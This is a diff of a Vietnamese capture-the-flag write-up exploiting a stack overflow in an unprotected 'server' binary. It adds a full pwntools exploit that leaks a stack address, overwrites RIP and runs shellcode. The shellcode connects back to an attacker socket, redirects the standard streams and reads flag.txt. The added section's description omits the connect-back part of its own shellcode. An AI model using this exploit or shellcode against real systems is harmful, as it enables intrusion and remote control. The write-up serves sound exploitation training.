@@ -15,7 +15,7 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   54 Symbols  No     0  
 ```
 * file `elf 64-bit`
-* file này thực thi được
+* các protection không được bật
 
 ```
 file "server" này sẽ mô phỏng một Server đang hoạt động, và nhiệm vụ là khai thác lỗ hổng trên server và lấy flag 
@@ -239,7 +239,7 @@ $1 = 0x190
 <img width="821" height="68" alt="image" src="https://github.com/user-attachments/assets/41133c7b-ff42-472f-b713-ae45f9813812" />
 
 
-Tạo payload với shellcode:
+C1: Tạo payload với shellcode:
 * kết nối về máy attacker qua socket
 * chuyển các streams về máy attacker
 * tạo shell
@@ -293,7 +293,7 @@ shellcode = asm("""
 	""")
 ```
 Bên cạnh đấy, padding payload cho đến RIP và overwrite với địa chỉ buffer tính được lúc nãy. Để khi chương trình thoát, RIP sẽ di chuyển đến buffer và thực thi shellcode ở đấy.
-```
+```c
 offset = RIP - buffer_addr
        = 616 (512 + 104)
 ```
@@ -307,12 +307,12 @@ Và trên stack bên server sẽ như sau:
 <img width="816" height="349" alt="image" src="https://github.com/user-attachments/assets/33833623-0401-4049-bbdd-4d2954aa2404" />
 
 Giờ để RIP trỏ tới buffer đang chứa shellcode, ta  phải kích hoạt được:
-```
+```c
     rd = read(fd,option,80);
     if (rd == 0) break;
 ```
 bằng cách thoát chương trình, có thể dùng:
-```
+```python
 # dong ket noi de ham RET -> rip tro den shellcode
 p.shutdown("send") 
 ```
@@ -417,6 +417,196 @@ p.shutdown("send") # dong ket noi de ham RET -> rip tro den shellcode
 
 p.interactive()
 ```
+
+C2: Shellcode open, read, write flag.txt từ server:
+* Open flag.txt
+* Read vào stack
+* Write flag từ stack ra terminal của ta
+
+Code asm:
+```asm
+shellcode = asm("""
+		mov rax, 41
+		mov rdi, 2
+		mov rsi, 1
+		mov rdx, 0
+		syscall
+
+		mov rbx, rax
+
+		mov rdx, 0
+		push rdx
+		mov rdx, 0x0100007f
+		push rdx
+		mov dx, 0x5c11
+		push dx
+		mov dx, 2 
+		push dx
+
+		mov rax, 42
+		mov rdi, rbx 
+		mov rsi, rsp 
+		mov rdx, 16  
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 0
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 1
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 2
+		syscall
+
+		mov rbx, 0
+		push rbx
+		mov rbx, 0x7478742e67616c66
+		push rbx
+
+		mov rax, 2
+		mov rdi, rsp
+		mov rsi, 0
+		mov rdx, 0
+		syscall
+
+		mov rbx, rax
+
+		mov rax, 0
+		mov rdi, rbx
+		mov rsi, rsp
+		mov rdx, 32
+		syscall
+
+		mov rax, 1
+		mov rdi, 1
+		mov rsi, rsp
+		mov rdx, 32
+		syscall
+	""")
+```
+Và hiện flag.txt:
+
+<img width="783" height="116" alt="image" src="https://github.com/user-attachments/assets/83fb223a-7a02-4ed7-8c25-0aece67f07da" />
+
+```python
+from pwn import *
+
+context.arch = "amd64"
+context.os   = "linux"
+context.log_level = "debug"
+
+p = remote("localhost", 1337)
+
+p.recvuntil(b"input your name: ")
+p.sendline(b"AAAA")
+
+p.sendlineafter(b"Input something to start: ", b"write")
+
+data_leak = p.recvuntil(b"Input something")
+
+addr = data_leak[0x40:0x48]
+addr = u64(addr.ljust(8, b"\x00"))
+print(f"addr: {hex(addr)}")
+buffer_addr = addr - 0x190
+print(f"buffer_addr: {hex(buffer_addr)}")
+
+# addr2 = data_leak[0x90:0x98]
+# addr2 = u64(addr2.ljust(8, b"\x00"))
+# print(f"addr2: {hex(addr2)}")
+# buffer_addr2 = addr2 - 0xc0
+# print(f"buffer_addr2: {hex(buffer_addr2)}")
+
+shellcode = asm("""
+		mov rax, 41
+		mov rdi, 2
+		mov rsi, 1
+		mov rdx, 0
+		syscall
+
+		mov rbx, rax
+
+		mov rdx, 0
+		push rdx
+		mov rdx, 0x0100007f
+		push rdx
+		mov dx, 0x5c11
+		push dx
+		mov dx, 2 
+		push dx
+
+		mov rax, 42
+		mov rdi, rbx 
+		mov rsi, rsp 
+		mov rdx, 16  
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 0
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 1
+		syscall
+
+		mov rax, 33
+		mov rdi, rbx
+		mov rsi, 2
+		syscall
+
+		mov rbx, 0
+		push rbx
+		mov rbx, 0x7478742e67616c66
+		push rbx
+
+		mov rax, 2
+		mov rdi, rsp
+		mov rsi, 0
+		mov rdx, 0
+		syscall
+
+		mov rbx, rax
+
+		mov rax, 0
+		mov rdi, rbx
+		mov rsi, rsp
+		mov rdx, 32
+		syscall
+
+		mov rax, 1
+		mov rdi, 1
+		mov rsi, rsp
+		mov rdx, 32
+		syscall
+	""")
+
+nop_sleds = b"\x90" * 20 # just in case 
+payload = nop_sleds + shellcode
+payload += b"A" * (512 - len(payload))
+## to rip
+## offset_to_rip = 0x7fffffffdcc8 - 0x7fffffffda60
+offset_to_rip = (616 - 512)
+payload += b"A" * offset_to_rip
+
+# da60
+payload += p64(0x7fffffffda60)
+print(f"payload_len: {len(payload)}")
+
+p.sendlineafter(b"to start: ", b"read")
+p.send(payload)
+
+p.shutdown("send") # dong ket noi de ham RET -> rip tro den shellcode
+
+p.interactive()
+```
+
 ___
 Tài liệu:
 
